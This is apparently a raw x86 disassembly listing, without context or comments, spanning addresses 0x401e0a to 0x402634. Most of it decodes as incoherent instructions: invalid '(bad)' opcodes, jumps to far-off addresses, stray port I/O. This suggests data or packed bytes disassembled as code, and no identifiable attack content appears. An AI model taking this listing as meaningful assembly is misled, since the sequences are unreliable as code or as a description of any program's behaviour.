  401e0a:	std    
  401e0b:	and    DWORD PTR [ecx-0x63],ebp
  401e0e:	addr16 (bad) 
  401e10:	out    dx,al
  401e11:	jo     0x401dc5
  401e13:	adc    BYTE PTR [ecx+0x36],dh
  401e16:	jne    0x401db0
  401e18:	jmp    0x705e8155
  401e1d:	mov    DWORD PTR [ebx-0x73],0x10b2815d
  401e24:	mov    ah,BYTE PTR [ebp+0x75]
  401e27:	cwde   
  401e28:	jmp    0x6efb535e
  401e2d:	popf   
  401e2e:	addr16 (bad) 
  401e30:	scas   al,BYTE PTR es:[edi]
  401e31:	jo     0x401de5
  401e33:	adc    BYTE PTR [ecx+0x36],dh
  401e36:	jne    0x401dd0
  401e38:	jmp    0xe866c175
  401e3d:	imul   esi,eax,0x5e
  401e40:	push   0x70f43270
  401e45:	ss jne 0x401df4
  401e48:	jmp    0x866c185
  401e4d:	cmp    al,0xcc
  401e4f:	add    al,0xb8
  401e51:	int3   
  401e52:	xor    esi,esp
  401e54:	mov    DWORD PTR [ebx],edi
  401e56:	jne    0x401e5a
  401e58:	jmp    0x401e60
  401e5d:	add    BYTE PTR [eax],al
  401e5f:	jne    0x401e64
  401e61:	pop    esp
  401e62:	stos   BYTE PTR es:[edi],al
  401e63:	fld    DWORD PTR [esi-0x33]
  401e66:	in     al,dx
  401e67:	inc    ebp
  401e68:	hlt    
  401e69:	mov    BYTE PTR [eax+0x75],ah
  401e6c:	ret    0x9a2e
  401e6f:	std    
  401e70:	and    al,BYTE PTR [eax]
  401e72:	cmp    eax,0xad44aedf
  401e77:	adc    DWORD PTR [ebx+0x2954911],esi
  401e7d:	shr    BYTE PTR [esi],0xf
  401e80:	mov    esp,DWORD PTR [eax]
  401e82:	gs or  ebx,ebp
  401e85:	sbb    al,0xca
  401e87:	fnsave [edx+0x2385411]
  401e8d:	shr    BYTE PTR [esi],0x11
  401e90:	loopne 0x401e91
  401e92:	in     eax,dx
  401e93:	cmc    
  401e94:	push   ebp
  401e95:	xor    eax,edi
  401e97:	push   0xffffffd6
  401e99:	dec    esp
  401e9a:	adc    DWORD PTR [ebp+0x39],0xffffffa4
  401e9e:	mov    bl,0x9f
  401ea0:	sti    
  401ea1:	push   ebp
  401ea2:	xchg   ebp,eax
  401ea3:	nop
  401ea4:	mov    ebx,ebp
  401ea6:	sbb    cl,BYTE PTR [ebx-0x5768ee4c]
  401eac:	add    al,al
  401eae:	scas   al,BYTE PTR es:[edi]
  401eaf:	in     al,dx
  401eb0:	mov    ah,BYTE PTR [eax]
  401eb2:	arpl   WORD PTR cs:[eax-0x4b2a9d3c],ax
  401eb9:	adc    DWORD PTR [ebp+edi*4+0x2],ebp
  401ebd:	adc    bl,al
  401ebf:	ja     0x401e46
  401ec1:	add    al,0x2c
  401ec3:	add    BYTE PTR [eax],al
  401ec5:	add    BYTE PTR [eax],al
  401ec7:	add    BYTE PTR [edi],dh
  401ec9:	cmp    esp,DWORD PTR [ebx+0x48164efa]
  401ecf:	jae    0x401e5c
  401ed1:	pushf  
  401ed2:	jg     0x401eb0
  401ed4:	scas   eax,DWORD PTR es:[edi]
  401ed5:	pop    edi
  401ed6:	jbe    0x401f28
  401ed8:	xchg   ebp,eax
  401ed9:	pop    ss
  401eda:	dec    ecx
  401edb:	or     BYTE PTR [ecx+0xc9711b3],0x2
  401ee2:	shr    BYTE PTR [esi],0xf
  401ee5:	mov    ah,BYTE PTR [eax]
  401ee7:	popa   
  401ee8:	xor    BYTE PTR [edi],al
  401eea:	daa    
  401eeb:	jg     0x401eae
  401eed:	mov    ah,0x11
  401eef:	add    BYTE PTR [edi+0x5610004d],bl
  401ef5:	add    eax,0x1ae7781
  401efa:	xor    eax,0xd117b749
  401eff:	adc    DWORD PTR [edx-0x5c3fff55],esp
  401f05:	jl     0x401e8f
  401f07:	and    ch,ch
  401f09:	mov    esp,0x1c64590
  401f0e:	rcl    BYTE PTR [ecx],1
  401f10:	gs add al,0x0
  401f13:	stos   BYTE PTR es:[edi],al
  401f14:	fmul   QWORD PTR [edi+0x2e]
  401f17:	and    al,0x24
  401f19:	imul   ecx,DWORD PTR [ebx+0x67],0x1e
  401f1d:	rcl    eax,cl
  401f1f:	adc    ecx,esp
  401f21:	xor    eax,0x9ce3c000
  401f26:	std    
  401f27:	push   DWORD PTR [esi+eiz*1-0x43]
  401f2b:	dec    ecx
  401f2c:	add    BYTE PTR [eax],al
  401f2e:	add    BYTE PTR [eax],al
  401f30:	add    BYTE PTR [edi-0x25],ch
  401f33:	rcl    BYTE PTR [ecx],1
  401f35:	add    DWORD PTR [esi],edi
  401f37:	add    al,al
  401f39:	jecxz  0x401ed7
  401f3b:	std    
  401f3c:	call   FWORD PTR [edx]
  401f3e:	cmc    
  401f3f:	fs call 0xbe19:0x11d1dbe3
  401f47:	add    BYTE PTR [eax],dl
  401f49:	daa    
  401f4a:	xor    al,0x3e
  401f4c:	std    
  401f4d:	sub    ebx,DWORD PTR [ebp-0x51]
  401f50:	ins    DWORD PTR es:[edi],dx
  401f51:	dec    ebx
  401f52:	adc    dl,dl
  401f54:	adc    edx,eax
  401f56:	into   
  401f57:	add    al,al
  401f59:	and    edi,DWORD PTR [edx-0x78]
  401f5c:	and    BYTE PTR [ecx-0x14781a],al
  401f62:	cmc    
  401f63:	rcl    DWORD PTR [ecx],1
  401f65:	loop   0x401f32
  401f67:	add    al,al
  401f69:	arpl   WORD PTR [eax+ecx*4+0x20],di
  401f6d:	jne    0x401f1e
  401f6f:	push   ss
  401f70:	sahf   
  401f71:	cmp    DWORD PTR [ebp-0x60],esp
  401f74:	rol    BYTE PTR [esi+ebp*2+0x236500b8],cl
  401f7b:	add    DWORD PTR [ebx+0x156a9b71],eax
  401f81:	cmp    dl,al
  401f83:	cmp    ecx,edx
  401f85:	fs mov DWORD PTR ss:[eax],eax
  401f89:	mov    ch,0x30
  401f8b:	mov    esp,0x3756eafd
  401f90:	sbb    al,0xf0
  401f92:	jns    0x401f1c
  401f94:	mov    bl,0x0
  401f96:	add    BYTE PTR [eax],al
  401f98:	add    BYTE PTR [eax],al
  401f9a:	cs push eax
  401f9c:	mov    bh,0x56
  401f9e:	sbb    ch,BYTE PTR ds:0x53139b3e
  401fa4:	push   DWORD PTR [edx-0x2c4948f6]
  401faa:	mov    al,BYTE PTR fs:[eax]
  401fad:	add    BYTE PTR [ebp+0x4f5100c3],al
  401fb3:	repz mov edi,DWORD PTR [edi-0x2c31e71e]
  401fba:	test   BYTE PTR [edx-0x5c7d0003],cl
  401fc0:	add    BYTE PTR [ecx+0x2f],dl
  401fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc4:	js     0x401f75
  401fc6:	adc    al,bl
  401fc8:	xor    edx,edx
  401fca:	fs aaa 
  401fcc:	retf   
  401fcd:	add    BYTE PTR ds:0x958899b0,dh
  401fd3:	jmp    0xe9b51fdb
  401fd8:	add    eax,DWORD PTR [eax]
  401fda:	jne    0x402035
  401fdc:	inc    BYTE PTR [edx+0x75]
  401fdf:	in     eax,0x3
  401fe1:	add    al,0x75
  401fe3:	loope  0x401fe8
  401fe5:	add    al,0x75
  401fe7:	jmp    0x2b562ec
  401fec:	in     eax,dx
  401fed:	add    edi,DWORD PTR [eax+0x2]
  401ff0:	stc    
  401ff1:	add    edi,DWORD PTR [ebp+0x2]
  401ff4:	jmp    0xe542d5f9
  401ff9:	add    esi,DWORD PTR [ebx+0x2]
  401ffc:	or     DWORD PTR [eax+eax*1],eax
  401fff:	add    BYTE PTR [eax],al
  402001:	add    BYTE PTR [eax],al
  402003:	push   ebp
  402004:	add    ch,cl
  402006:	add    BYTE PTR [esi+0x7903ed02],dh
  40200c:	add    bl,cl
  40200e:	add    esp,DWORD PTR [ebp+0x2]
  402011:	fldenv ds:0x3f10236
  402017:	test   DWORD PTR [edx],eax
  402019:	leave  
  40201a:	add    edx,DWORD PTR [ebp+0x3625d902]
  402020:	add    dh,cl
  402022:	add    esp,DWORD PTR [ebp+0x2]
  402025:	imul   eax,DWORD PTR [ebx],0x25b901f5
  40202b:	ss add ah,cl
  40202e:	add    edx,DWORD PTR [ebp+0x75036902]
  402034:	add    DWORD PTR [ecx],ebx
  402036:	es add cl,BYTE PTR ss:[ecx]
  40203a:	add    al,0xf5
  40203c:	add    ebx,ebp
  40203e:	add    dh,BYTE PTR [ebp+0x6]
  402041:	stc    
  402042:	and    eax,0x4090236
  402047:	ja     0x40204a
  402049:	jmp    0x40204d
  40204b:	jne    0x40203f
  40204d:	clc    
  40204e:	and    eax,0x3e90236
  402053:	jne    0x402057
  402055:	jmp    0x8942955d
  40205a:	or     BYTE PTR [ebp+0x2],dh
  40205d:	jmp    0xe942e56d
  402062:	or     esp,DWORD PTR [ebp+0x2]
  402065:	aad    0xb
  402067:	add    BYTE PTR [eax],al
  402069:	add    BYTE PTR [eax],al
  40206b:	add    dh,al
  40206d:	add    al,BYTE PTR [eax]
  40206f:	fld    TBYTE PTR [ebp-0x3]
  402072:	(bad)  
  402073:	call   0xe94072e6
  402078:	jle    0x40208c
  40207a:	add    cl,ch
  40207c:	jns    0x402040
  40207e:	add    cl,bh
  402080:	jnp    0x40208a
  402082:	add    cl,ch
  402084:	outs   dx,BYTE PTR ds:[esi]
  402085:	bound  eax,QWORD PTR [eax]
  402087:	jmp    0xe940430a
  40208c:	jns    0x402030
  40208e:	add    cl,ch
  402090:	outs   dx,BYTE PTR ds:[esi]
  402091:	add    al,BYTE PTR [eax]
  402093:	jmp    0xe940a306
  402098:	jle    0x4020dc
  40209a:	add    cl,ch
  40209c:	jns    0x402080
  40209e:	add    cl,bh
  4020a0:	jnp    0x4020a6
  4020a2:	add    cl,ch
  4020a4:	outs   dx,BYTE PTR ds:[esi]
  4020a5:	cmp    al,BYTE PTR [eax]
  4020a7:	jmp    0xe9401b2a
  4020ac:	jns    0x402120
  4020ae:	add    dl,bl
  4020b0:	jnp    0x4020cb
  4020b2:	add    cl,ch
  4020b4:	outs   dx,BYTE PTR ds:[esi]
  4020b5:	pop    edx
  4020b6:	add    cl,ch
  4020b8:	jle    0x4020d4
  4020ba:	add    cl,ch
  4020bc:	jns    0x402070
  4020be:	add    al,bh
  4020c0:	jnp    0x4020b5
  4020c2:	(bad)  
  4020c3:	call   0xe9408b36
  4020c8:	jle    0x4020f4
  4020ca:	add    cl,ch
  4020cc:	jns    0x402060
  4020ce:	add    cl,ch
  4020d0:	add    BYTE PTR [eax],al
  4020d2:	add    BYTE PTR [eax],al
  4020d4:	add    BYTE PTR [esi+0xa],ch
  4020d7:	add    cl,ch
  4020d9:	outs   dx,BYTE PTR ds:[esi]
  4020da:	mov    al,BYTE PTR [eax]
  4020dc:	jmp    0xe9406b5f
  4020e1:	jns    0x4020b5
  4020e3:	add    cl,bh
  4020e5:	jnp    0x4020ed
  4020e7:	add    cl,ch
  4020e9:	outs   dx,BYTE PTR ds:[esi]
  4020ea:	add    BYTE PTR ss:[eax],al
  4020ed:	pop    esp
  4020ee:	or     DWORD PTR [eax+eax*1],edx
  4020f1:	and    DWORD PTR [ecx],ecx
  4020f3:	jecxz  0x4020f5
  4020f5:	pop    ds
  4020f6:	add    al,0x2b
  4020f8:	add    BYTE PTR [ecx+ecx*1+0x74],cl
  4020fc:	add    BYTE PTR [ecx+ecx*1],bl
  4020ff:	xor    al,0x0
  402101:	sbb    al,0xe
  402103:	enter  0x1d00,0x4
  402107:	or     eax,0x64090c00
  40210c:	add    BYTE PTR [ecx+ecx*1],bl
  40210f:	and    al,0x0
  402111:	sbb    al,0xe
  402113:	test   al,0x0
  402115:	or     al,0x9
  402117:	add    al,0x0
  402119:	or     al,0x9
  40211b:	test   BYTE PTR [eax],al
  40211d:	fmul   QWORD PTR [eax]
  40211f:	inc    esp
  402120:	add    ah,bl
  402122:	or     eax,0x3dc00e8
  402127:	or     BYTE PTR [eax],al
  402129:	int3   
  40212a:	or     BYTE PTR [eax+eax*1-0x24],bl
  40212e:	or     BYTE PTR [eax+eax*1],bl
  402131:	fmul   QWORD PTR ds:0x3a00098
  402137:	push   ebx
  402138:	add    BYTE PTR [eax],al
  40213a:	add    BYTE PTR [eax],al
  40213c:	add    BYTE PTR [eax],al
  40213e:	int3   
  40213f:	or     BYTE PTR [eax+eax*1-0x64],bh
  402143:	or     BYTE PTR [eax+eax*1],bh
  402146:	pushf  
  402147:	or     eax,0x39e00d8
  40214c:	pop    ss
  40214d:	add    BYTE PTR [eax+ecx*1+0x89c006c],cl
  402154:	sub    al,0x0
  402156:	pushf  
  402157:	or     eax,0x88c00b8
  40215c:	or     al,0x0
  40215e:	mov    WORD PTR [eax],cs
  402160:	mov    WORD PTR [eax],es
  402162:	pop    esp
  402163:	or     BYTE PTR [eax+eax*1+0x5c],cl
  402167:	psubb  mm0,QWORD PTR [eax]
  40216a:	jne    0x402145
  40216c:	push   es
  40216d:	add    esi,DWORD PTR [ebp-0x17]
  402170:	or     edx,DWORD PTR [edx+0x75]
  402173:	jmp    0xb6b53383
  402178:	or     esp,DWORD PTR [ebx+0x2306b875]
  40217e:	jne    0x402169
  402180:	or     esi,DWORD PTR [edx+0x75]
  402183:	jmp    0xe9b55393
  402188:	or     al,ah
  40218a:	jne    0x402166
  40218c:	add    al,0xb
  40218e:	jne    0x402179
  402190:	or     esp,DWORD PTR [edx+0x75]
  402193:	jmp    0xe9b543a3
  402198:	or     ah,BYTE PTR [ebp+esi*2+0x75020be9]
  40219f:	jmp    0x40a3af
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	add    BYTE PTR [ebp-0x17],dh
  4021a9:	or     eax,DWORD PTR [edx+0x75]
  4021ac:	jmp    0xd9b605bb
  4021b1:	add    al,0x7
  4021b3:	jne    0x40219e
  4021b5:	or     ebx,DWORD PTR [edx+0x75]
  4021b8:	jmp    0xe9b53bc8
  4021bd:	or     dl,BYTE PTR [ebp+esi*2+0x754304bd]
  4021c4:	jmp    0xe9b59bd4
  4021c9:	or     edi,DWORD PTR [edx]
  4021cb:	jne    0x4021b6
  4021cd:	or     dl,ah
  4021cf:	jne    0x4021a8
  4021d1:	add    al,0x13
  4021d3:	jne    0x4021be
  4021d5:	or     ebp,DWORD PTR [edx+0x75]
  4021d8:	jmp    0xe9b54be8
  4021dd:	or     dh,BYTE PTR [ebp+esi*2+0x750a0be9]
  4021e4:	jmp    0x2b5abf4
  4021e9:	jmp    0xe942e0f9
  4021ee:	or     ch,BYTE PTR [ecx+0x2]
  4021f1:	stc    
  4021f2:	add    al,0x70
  4021f4:	add    ch,cl
  4021f6:	or     ebp,DWORD PTR [ebx+0x630be902]
  4021fc:	add    ch,BYTE PTR [ecx-0x25fd8af5]
  402202:	add    al,0x86
  402204:	add    ch,cl
  402206:	or     ebp,DWORD PTR [ebx+0xbe902]
  40220c:	add    BYTE PTR [eax],al
  40220e:	add    BYTE PTR [eax],al
  402210:	arpl   WORD PTR [edx],ax
  402212:	jmp    0xf8425321
  402217:	add    al,0x6a
  402219:	add    ch,cl
  40221b:	or     ebx,DWORD PTR [ebx+0x530be902]
  402221:	add    ch,cl
  402223:	or     dl,cl
  402225:	add    ecx,ebp
  402227:	or     esi,DWORD PTR [ebx+0x2]
  40222a:	jmp    0xe9421d3a
  40222f:	or     esi,DWORD PTR [ebx]
  402231:	add    ch,cl
  402233:	or     dl,cl
  402235:	add    ecx,edi
  402237:	add    al,0x6c
  402239:	add    ch,cl
  40223b:	or     esi,DWORD PTR [ebx]
  40223d:	add    ch,cl
  40223f:	or     ebp,DWORD PTR [ebx+0x2]
  402242:	jmp    0xdd420351
  402247:	add    al,0x56
  402249:	add    ch,cl
  40224b:	or     esi,DWORD PTR [ebx]
  40224d:	add    ch,cl
  40224f:	or     ebp,DWORD PTR [ebx+0x2]
  402252:	jmp    0xfb41e361
  402257:	add    al,0x7e
  402259:	add    ch,cl
  40225b:	or     esp,DWORD PTR [ebx]
  40225d:	add    ch,cl
  40225f:	or     ebx,DWORD PTR [ebx+0x2]
  402262:	jmp    0x41e371
  402267:	jmp    0xe9402eda
  40226c:	jle    0x4021f6
  40226e:	add    cl,ch
  402270:	jle    0x4022ba
  402272:	add    cl,ch
  402274:	add    BYTE PTR [eax],al
  402276:	add    BYTE PTR [eax],al
  402278:	add    BYTE PTR [edi-0x2a],ch
  40227b:	add    BYTE PTR [ecx-0x16fffd8f],cl
  402281:	jle    0x4022b6
  402283:	add    cl,ch
  402285:	jle    0x40227a
  402287:	call   ebx
  402289:	outs   dx,BYTE PTR ds:[esi]
  40228a:	test   DWORD PTR [eax],eax
  40228c:	(bad)  [ecx-0x7]
  40228f:	(bad)  
  402290:	call   0xe9407613
  402295:	jle    0x4022aa
  402297:	add    cl,ch
  402299:	jno    0x40225f
  40229b:	add    cl,bh
  40229d:	ja     0x4022ab
  40229f:	add    cl,ch
  4022a1:	jle    0x402306
  4022a3:	add    cl,ch
  4022a5:	jle    0x4022ca
  4022a7:	add    cl,ch
  4022a9:	jno    0x40224f
  4022ab:	add    cl,ch
  4022ad:	outs   dx,BYTE PTR ds:[esi]
  4022ae:	add    eax,DWORD PTR [eax]
  4022b0:	jmp    0xe940a633
  4022b5:	jle    0x4022fa
  4022b7:	add    cl,ch
  4022b9:	jno    0x40229f
  4022bb:	add    cl,bh
  4022bd:	ja     0x4022bf
  4022bf:	add    cl,ch
  4022c1:	jle    0x4022fe
  4022c3:	add    cl,ch
  4022c5:	jle    0x4022c2
  4022c7:	(bad)  
  4022c8:	call   0xda40973e
  4022cd:	ja     0x4022ec
  4022cf:	add    cl,ch
  4022d1:	jle    0x40232e
  4022d3:	add    cl,ch
  4022d5:	jle    0x4022f2
  4022d7:	add    cl,ch
  4022d9:	jno    0x40228f
  4022db:	add    al,bh
  4022dd:	add    BYTE PTR [eax],al
  4022df:	add    BYTE PTR [eax],al
  4022e1:	add    BYTE PTR [edi-0xd],dh
  4022e4:	(bad)  
  4022e5:	call   0x408e68
  4022ea:	pushf  
  4022eb:	or     eax,0x68c0029
  4022f0:	mov    dl,0x0
  4022f2:	mov    WORD PTR ds:0xd5c0009,cs
  4022f8:	mov    DWORD PTR [eax],eax
  4022fa:	pop    esp
  4022fb:	or     eax,0x64c0049
  402300:	repnz add BYTE PTR [esp+eax*1+0x4],bl
  402305:	add    BYTE PTR [ebp+ecx*1+0x55],bl
  402309:	add    BYTE PTR [ebp+ecx*1+0x15],bl
  40230d:	add    BYTE PTR [ecx*1+0x41f0102],bl
  402314:	sub    eax,DWORD PTR [eax]
  402316:	sbb    al,0xd
  402318:	jne    0x40231a
  40231a:	sbb    al,0xd
  40231c:	xor    eax,0xca060c00
  402321:	add    BYTE PTR ds:0x1c000d04,bl
  402327:	or     eax,0xd1c0065
  40232c:	and    eax,0xaa060c00
  402331:	add    BYTE PTR [ecx*1+0xcdc0005],cl
  402338:	test   DWORD PTR [eax],eax
  40233a:	fmul   QWORD PTR [eax*2-0x15fa3400]
  402341:	add    ah,bl
  402343:	add    ecx,DWORD PTR [eax]
  402345:	add    BYTE PTR [eax],al
  402347:	add    BYTE PTR [eax],al
  402349:	add    BYTE PTR [eax],al
  40234b:	fmul   QWORD PTR [ebx*2+0x1d0cdc00]
  402352:	add    ah,cl
  402354:	add    eax,0x398009a
  402359:	push   ebx
  40235a:	add    BYTE PTR [esp+ecx*1+0xc9c007d],bl
  402361:	cmp    eax,0xda058c00
  402366:	add    BYTE PTR [ebp-0x23],dh
  402369:	add    dl,BYTE PTR [edi]
  40236b:	jne    0x402358
  40236d:	or     ebp,DWORD PTR [ebp+0x75]
  402370:	jmp    0x40237d
  402372:	sub    eax,0xba0ceb75
  402377:	jne    0x402364
  402379:	or     ecx,DWORD PTR ds:0x8d0be975
  40237f:	jne    0x40236a
  402381:	or     ecx,DWORD PTR [ebp+0x75]
  402384:	jmp    0xd9b61d95
  402389:	add    al,BYTE PTR [ebx]
  40238b:	jne    0x402376
  40238d:	or     edx,DWORD PTR [ebx+0x75]
  402390:	jmp    0xaeb536a0
  402395:	or     eax,ebx
  402397:	jne    0x402355
  402399:	add    ah,BYTE PTR [ebx]
  40239b:	jne    0x402386
  40239d:	or     esi,DWORD PTR [ebx+0x75]
  4023a0:	jmp    0xe9b556b0
  4023a5:	or     al,dh
  4023a7:	jne    0x402383
  4023a9:	add    BYTE PTR [ebx],cl
  4023ab:	jne    0x402396
  4023ad:	or     esp,DWORD PTR [ebx+0x0]
  4023b0:	add    BYTE PTR [eax],al
  4023b2:	add    BYTE PTR [eax],al
  4023b4:	jne    0x40239f
  4023b6:	or     esp,DWORD PTR [ebx]
  4023b8:	jne    0x4023a3
  4023ba:	or     ah,BYTE PTR [esi+0x30be975]
  4023c0:	jne    0x4023ab
  4023c2:	or     eax,DWORD PTR [ebx+0x430be975]
  4023c8:	jne    0x4023b3
  4023ca:	or     ah,dh
  4023cc:	jne    0x4023a7
  4023ce:	add    BYTE PTR [edi],al
  4023d0:	jne    0x4023bb
  4023d2:	or     ebx,DWORD PTR [ebx+0x75]
  4023d5:	jmp    0xe9b53ee5
  4023da:	or     dl,BYTE PTR [esi+0x4300b575]
  4023e0:	jne    0x4023cb
  4023e2:	or     edi,DWORD PTR [ebx+0x75]
  4023e5:	add    ch,cl
  4023e7:	or     ebx,DWORD PTR [esi+0x2]
  4023ea:	jmp    0xfb42e6f9
  4023ef:	add    BYTE PTR [esi+0x2],ah
  4023f2:	jmp    0xe9424202
  4023f7:	or     ecx,DWORD PTR [esi+0x2]
  4023fa:	jmp    0xe942e709
  4023ff:	or     edi,DWORD PTR [esi+0x2]
  402402:	jmp    0xe9422212
  402407:	or     ebp,DWORD PTR [esi+0x630ae902]
  40240d:	add    bh,cl
  40240f:	add    BYTE PTR [eax+0x2],bh
  402412:	jmp    0xe942c622
  402417:	or     eax,DWORD PTR [eax]
  402419:	add    BYTE PTR [eax],al
  40241b:	add    BYTE PTR [eax],al
  40241d:	push   0x2
  40241f:	test   eax,0xda02750b
  402424:	add    BYTE PTR [esi+0x2],ah
  402427:	jmp    0xe942c637
  40242c:	or     ebp,DWORD PTR [edx+0x2]
  40242f:	jmp    0xf8424f3e
  402434:	add    BYTE PTR [edx-0x6df416fe],al
  40243a:	add    ch,cl
  40243c:	or     ebx,DWORD PTR [edx+0x2]
  40243f:	jmp    0xe941ef4e
  402444:	or     edi,DWORD PTR [edx+0x2]
  402447:	jmp    0xe9421657
  40244c:	or     edi,DWORD PTR [edx]
  40244e:	add    ch,cl
  402450:	or     cl,bl
  402452:	add    ecx,edi
  402454:	add    BYTE PTR [edx+eax*1-0x17],bh
  402458:	or     ebp,DWORD PTR [edx]
  40245a:	add    ch,cl
  40245c:	or     esp,DWORD PTR [edx+0x2]
  40245f:	jmp    0x41ff6e
  402464:	fnsave [ebp+0x63]
  402467:	add    cl,ch
  402469:	jle    0x4024c2
  40246b:	add    cl,ch
  40246d:	outs   dx,BYTE PTR ds:[esi]
  40246e:	pop    ss
  40246f:	add    cl,ch
  402471:	outs   dx,DWORD PTR ds:[esi]
  402472:	mov    eax,0xfb75fb00
  402477:	(bad)  
  402478:	call   0xe9408bfb
  40247d:	outs   dx,BYTE PTR ds:[esi]
  40247e:	daa    
  40247f:	add    cl,ch
  402481:	add    BYTE PTR [eax],al
  402483:	add    BYTE PTR [eax],al
  402485:	add    BYTE PTR [edi-0x68],ch
  402488:	add    cl,ch
  40248a:	jle    0x402491
  40248c:	add    cl,ch
  40248e:	jle    0x402415
  402490:	add    cl,ch
  402492:	outs   dx,BYTE PTR ds:[esi]
  402493:	inc    ebp
  402494:	add    cl,ch
  402496:	outs   dx,DWORD PTR ds:[esi]
  402497:	aam    0x0
  402499:	mov    DWORD PTR [ebp+0x2],esi
  40249c:	add    cl,ch
  40249e:	jle    0x4024d2
  4024a0:	add    cl,ch
  4024a2:	outs   dx,BYTE PTR ds:[esi]
  4024a3:	bnd call esp
  4024a6:	outs   dx,BYTE PTR ds:[esi]
  4024a7:	push   ecx
  4024a8:	add    bl,bl
  4024aa:	jne    0x4024a1
  4024ac:	(bad)  
  4024ad:	call   0xe9407730
  4024b2:	outs   dx,BYTE PTR ds:[esi]
  4024b3:	adc    al,BYTE PTR [eax]
  4024b5:	jmp    0xf940e823
  4024ba:	adc    ecx,DWORD PTR [eax+eax*1]
  4024bd:	jmp    0xe9408740
  4024c2:	outs   dx,BYTE PTR ds:[esi]
  4024c3:	and    al,BYTE PTR [eax]
  4024c5:	jmp    0xe940c833
  4024ca:	jle    0x4024ce
  4024cc:	add    cl,ch
  4024ce:	jle    0x402452
  4024d0:	add    cl,ch
  4024d2:	outs   dx,BYTE PTR ds:[esi]
  4024d3:	inc    edx
  4024d4:	add    cl,ch
  4024d6:	imul   esp,ebx,0xffd3f900
  4024dc:	(bad)  
  4024dd:	call   0x405f60
  4024e2:	int3   
  4024e3:	or     DWORD PTR [eax],ebx
  4024e5:	add    ah,cl
  4024e7:	push   es
  4024e8:	xchg   ecx,eax
  4024e9:	add    BYTE PTR [eax],al
  4024eb:	add    BYTE PTR [eax],al
  4024ed:	add    BYTE PTR [eax],al
  4024ef:	iret   
  4024f0:	aam    0x3a
  4024f2:	add    BYTE PTR [ecx+ecx*1+0x98c0078],bl
  4024f9:	cmp    BYTE PTR [eax],al
  4024fb:	mov    WORD PTR [esi],es
  4024fd:	rol    DWORD PTR [eax],1
  4024ff:	(bad)  
  402500:	aam    0x10
  402502:	add    BYTE PTR [ecx+ecx*1+0x98c0068],bl
  402509:	sub    BYTE PTR [eax],al
  40250b:	mov    WORD PTR [esi],es
  40250d:	mov    cl,0x0
  40250f:	pop    esp
  402510:	or     DWORD PTR [eax],ecx
  402512:	add    BYTE PTR [ecx+ecx*1-0x78],bl
  402516:	add    BYTE PTR [ecx+ecx*1+0x48],cl
  40251a:	add    BYTE PTR [esi+eax*1-0xf],cl
  40251e:	add    BYTE PTR [esp+edx*8+0x3],cl
  402522:	add    BYTE PTR [ecx+ecx*1+0x54],bl
  402526:	add    BYTE PTR [ecx+ecx*1+0x14],cl
  40252a:	add    BYTE PTR [ecx],ah
  40252c:	or     ebx,esp
  40252e:	add    BYTE PTR [edi-0x2c],cl
  402531:	sub    al,BYTE PTR [eax]
  402533:	sbb    al,0x9
  402535:	je     0x402537
  402537:	or     al,0x9
  402539:	xor    al,0x0
  40253b:	or     al,0x6
  40253d:	leave  
  40253e:	add    BYTE PTR ds:0x1c000cd4,cl
  402544:	or     DWORD PTR [eax+eax*1+0xc],esp
  402548:	or     DWORD PTR [eax+eax*1],esp
  40254b:	or     al,0x6
  40254d:	test   eax,0x408dc00
  402552:	add    BYTE PTR [eax],al
  402554:	add    BYTE PTR [eax],al
  402556:	add    BYTE PTR [eax],al
  402558:	fmul   QWORD PTR [eax]
  40255a:	test   BYTE PTR [eax],al
  40255c:	int3   
  40255d:	or     BYTE PTR [eax+eax*1-0x34],al
  402561:	add    eax,0xdb7500e9
  402566:	inc    BYTE PTR [edi]
  402568:	jne    0x402555
  40256a:	or     ebx,DWORD PTR [ebp+esi*2-0x15]
  40256e:	or     ebx,DWORD PTR [esi*2+0x75990ceb]
  402575:	mov    bh,0xfe
  402577:	push   edx
  402578:	jne    0x402565
  40257a:	or     edi,DWORD PTR [ebp+esi*2-0x15]
  40257e:	or     edi,DWORD PTR [esi*2+0x75d90ceb]
  402585:	fsin   
  402587:	push   ss
  402588:	jne    0x402575
  40258a:	or     ebp,DWORD PTR [ebp+esi*2-0x15]
  40258e:	or     ebp,DWORD PTR [esi*2+0x75b90ceb]
  402595:	jmp    0xe9b531a5
  40259a:	or     ecx,DWORD PTR [ebp+esi*2+0x754c0be9]
  4025a1:	jmp    0xd9b61eb2
  4025a6:	inc    BYTE PTR [edx]
  4025a8:	jne    0x402593
  4025aa:	or     edx,DWORD PTR [edx+0x75]
  4025ad:	jmp    0xaeb537bd
  4025b2:	or     esp,DWORD PTR [ebx+0x22feb875]
  4025b8:	jne    0x4025a3
  4025ba:	or     esi,DWORD PTR [edx+0x0]
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [eax],al
  4025c1:	jne    0x4025ac
  4025c3:	or     esi,DWORD PTR [edx]
  4025c5:	jne    0x4025b0
  4025c7:	or     al,ch
  4025c9:	jne    0x4025a5
  4025cb:	cld    
  4025cc:	or     dh,BYTE PTR [ebp-0x17]
  4025cf:	or     esp,DWORD PTR [edx+0x75]
  4025d2:	jmp    0xe9b547e2
  4025d7:	or     ah,BYTE PTR [ebp+0x20be975]
  4025dd:	jne    0x4025c8
  4025df:	or     eax,DWORD PTR [edx+0xbe90275]
  4025e5:	aaa    
  4025e6:	add    ch,cl
  4025e8:	or     bl,al
  4025ea:	add    bh,cl
  4025ec:	cld    
  4025ed:	jae    0x4025f1
  4025ef:	jmp    0xe94244ff
  4025f4:	or     ebx,DWORD PTR [edi+0x2]
  4025f7:	jmp    0xdd432e06
  4025fc:	cld    
  4025fd:	aaa    
  4025fe:	add    ch,cl
  402600:	or     ebx,DWORD PTR [edi]
  402602:	add    ch,cl
  402604:	or     ebx,DWORD PTR [edi+0x2]
  402607:	jmp    0xfb42ce16
  40260c:	cld    
  40260d:	addr16 add ch,cl
  402610:	or     ecx,DWORD PTR [edi]
  402612:	add    ch,cl
  402614:	or     ecx,DWORD PTR [edi+0x2]
  402617:	jmp    0xe9424e26
  40261c:	or     edi,DWORD PTR [edi+0x2]
  40261f:	jmp    0xe942152f
  402624:	or     eax,DWORD PTR [eax]
  402626:	add    BYTE PTR [eax],al
  402628:	add    BYTE PTR [eax],al
  40262a:	scas   eax,DWORD PTR es:[edi]
  40262b:	add    ch,cl
  40262d:	or     cl,BYTE PTR [eax+0x2]
  402630:	stc    
  402631:	cld    
  402632:	jno    0x402636
  402634:	jmp    0xe942d144
